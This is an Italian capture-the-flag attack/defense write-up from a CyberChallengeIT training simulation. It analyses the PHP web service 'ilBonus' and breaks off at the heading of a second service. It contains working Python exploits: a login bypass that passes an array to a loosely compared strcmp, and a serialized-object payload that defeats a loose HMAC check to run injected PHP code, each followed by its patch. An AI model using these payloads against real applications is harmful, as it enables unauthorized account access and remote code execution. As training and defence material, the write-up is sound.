# Simulazione 0

Pre-simulazione in formato Attack/Defense svolta il 19 e 20 maggio per l'addestramento previsto dal percorso CyberChallengeIT.

I servizi qui proposti erano:
* ilBonus
* WAQS

## ilBonus
_Categoria: web_

ilBonus è un'applicazione web sviluppata con PHP che permette agli utenti di registrarsi per richiedere dei bonus sotto forma di voucher. Questi possono poi essere verificati e riscossi.

![alt text](imgs/ilbonus.png)

### Vulnerabilità 1 - Loose Comparison in Login

Questo servizio soffre di una vulnerabilità comune di PHP, ovvero l'utilizzo di una loose comparison. In particolare, la password inserita dall'utente viene confrontata con la password dell'utente memorizzata nel DB attraverso l'uso della funzione built-in _strcmp_. Tuttavia, si confronta il risultato della strcmp con 0 (password uguali) attraverso un == (loose comparison) e non attraverso un === (strict comparison). 

```php
function login_with_password($user, $password) {
    global $users;
    $document = array('email' => (string) $user);
    $cursor = $users->find($document);
    $it = new \IteratorIterator($cursor);
    $it->rewind();
    while($userdb = $it->current()){
				if(strcmp($password, $userdb['password'])==0) {
					$_SESSION["email"] = $user;
					// User is logged in
					$_SESSION["loggedin"] = true;
					return true;
				}else{
                    break;
                }
    }
    return false;
}
```

Individuato ciò, basta fare in modo che la strcmp restituisca NULL, poiché per la versione di PHP utilizzata, NULL == 0 è True. Per avere NULL come risultato di strcmp, basta semplicemente passare come password un array.

#### Exploit

A questo punto l'exploit è molto breve. Basta sfruttare gli username presenti come flagIds e fare il login per questi account sfruttando la vulnerabilità indicata. In seguito la flag si trova in */profilo* nella sezione "Ulteriori informazioni".

```python
def get(ip, username):
	session = requests.Session()
	burp0_url = f"http://{ip}:8080/login"
	
	burp0_data = {"email": username, "password[]": "a"}
	resp1 = session.post(burp0_url, data=burp0_data)
	resp2 = session.get(f"http://{ip}:8080/profilo")
	
	#soup = BeautifulSoup(resp2.content, "html.parser")
	#flag = soup.find_all("textarea", class_="form-control")[0].text[:32]
	
	flag = re.findall("[A-Z0-9]{31}=", resp2.text)[0]
	return flag
```

Come possiamo notare per passare un array è stato necessario passare "password[]=\<password\>" anziché "password=\<password\>"


#### Patch

La patch è molto semplice: basta sostituire la loose comparison con una strict comparison, andando a modificare il "==" in "===".

```php
if(strcmp($password, $userdb['password'])===0) {
```


### Vulnerabilità 2 - Deserialization Attack, Loose Comparison

I voucher richiesti vengono serializzati e deserializzati. Inoltre, la classe Voucher presenta il metodo magico __wakeup, che verrà eseguito quando si deserializza un oggetto Voucher, andando ad eseguire il codice presente all'interno dell'hook. Possiamo notare che per poter inserire del codice hook arbitrario è necessario superare il controllo sull'HMAC e inserire un id di un voucher valido. Tuttavia, il controllo sull'HMAC viene fatto nuovamente con una semplice loose comparison che, per la versione PHP utilizzata dall'applicazione, permette di confrontare con successo troppe cose. 

Per esempio, passando un HMAC come valore booleano a true è possibile superare sempre la condizione perché si va ad effettuare il seguente controllo: "string" == TRUE, e questo è sempre vero in quanto equivale a verificare se la stringa è impostata o meno.

```php
function __wakeup(){
        global $secret;
        global $a, $start, $end, $run_test, $$end, $$start, $logger;
        if ($this->hmac == md5($secret . serialize($this->voucher) . $this->hook)){
            global $vouchers;
            if($vouchers->count(array("_id" => $this->voucher['_id'])) == 0){
                $this->hook = "echo \"Errore! Voucher non valido\"; exit();";
            }else{
                //all good
            }
        }else{
            $this->hook = "echo \"Errore! Rilevata Manomissione Voucher\"; exit();";
        }
        $logger->log_action(
            "Unserialized voucher ".$this->voucher['utente']. ' '. 
            $this->voucher['descrizione'].' '.$this->hook
        );
        if (isset($$a->{$start.$end})) $run_test($$a->{$$end.$$start});
    }
```

#### Exploit

Per poter sfruttare tale vulnerabilità, bisogna effettuare una serie di passaggi. In particolare, bisogna:
1. Registrarsi;
2. Loggarsi;
3. Richiedere un voucher;
4. Riscuotere il voucher richiesto.

```python
def get(ip, username):
	session = requests.Session()
	reg_username = get_random_string(10) + "@gmail.com"
	reg_password = get_random_string(10)
	
	register(session, ip, reg_username, reg_password)
	login(session, ip, reg_username, reg_password)
	resp = richiedi(session, ip)
	oid_buono = resp[143:167]

	r = riscuoti(session, ip, oid_buono, username)
	flag = re.findall("[A-Z0-9]{31}=", r.text)[0]
	return flag
```

La riscossione è proprio il passaggio più importante perché permette riscuotere un buono inserendo, però, delle informazioni che ci permettono di bypassare il controllo sull'HMAC e di inserire del codice malevolo per avere una RCE:

```python
def riscuoti(session, ip, oid_buono, username):
    burp0_url = f"http://{ip}:8080/riscuoti"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------64052321125013213451568947986", "Connection": "close", "Upgrade-Insecure-Requests": "1"}

    size = str(180+len(username))
    
    burp0_data = "-----------------------------64052321125013213451568947986\r\nContent-Disposition: form-data; name=\"voucherfile\"; filename=\"Voucher.vou\"\r\nContent-Type: application/octet-stream\r\n\r\nO:7:\"Voucher\":3:{s:7:\"voucher\";O:26:\"MongoDB\\Model\\BSONDocument\":4:{i:0;i:2;i:1;a:7:{s:3:\"_id\";O:21:\"MongoDB\\BSON\\ObjectId\":1:{s:3:\"oid\";s:24:\"" + oid_buono + "\";}s:9:\"categoria\";s:8:\"Computer\";s:11:\"descrizione\";s:0:\"\";s:7:\"negozio\";s:0:\"\";s:9:\"indirizzo\";s:0:\"\";s:5:\"infos\";s:0:\"\";s:6:\"utente\";s:11:\"xxx@xxx.com\";}i:2;a:0:{}i:3;N;}s:13:\"\x00Voucher\x00hmac\";b:1;s:13:\"\x00Voucher\x00hook\";s:" + size + ":\"global $users;$document = array('email' => \"" + username + "\");$cursor = $users->find($document);$it = new \\IteratorIterator($cursor);$it->rewind();$user = $it->current();echo($user->infos);die();\";}\r\n-----------------------------64052321125013213451568947986\r\nContent-Disposition: form-data; name=\"codicecassa\"\r\n\r\n\r\n-----------------------------64052321125013213451568947986\r\nContent-Disposition: form-data; name=\"numeroscontrino\"\r\n\r\n\r\n-----------------------------64052321125013213451568947986\r\nContent-Disposition: form-data; name=\"iban\"\r\n\r\n\r\n-----------------------------64052321125013213451568947986--\r\n"

    resp = session.post(burp0_url, headers=burp0_headers, data=burp0_data)
    return resp
```

Come possiamo vedere qui è stato inserito codice PHP in hook. Esso prevede, innanzitutto, di effettuare una query al DB (mongoDB) andando a recuperare l'utente in base all'email specificata (flagId). Successivamente si vanno a prendere le info dell'utente e, come prima, troviamo la flag in "Ulteriori informazioni".

#### Patch

Il modo più veloce per patchare questa vulnerabilità è stato quello di andare a sostituire la loose comparison con una strict comparison nel confronto tra HMAC:

```php
if ($this->hmac === md5($secret . serialize($this->voucher) . $this->hook)){
```

Inoltre, qualora tutti i controlli andassero a buon fine, l'hook viene impostato a "", per fare in modo che, se qualcuno trovi altri modi per bypassare le verifiche e impostare l'hook in questo modo, esso venga automaticamente cancellato.

```php
} else{
    //all good
    $this->hook = "";
}
```



## WAQS
_Categoria: pwn_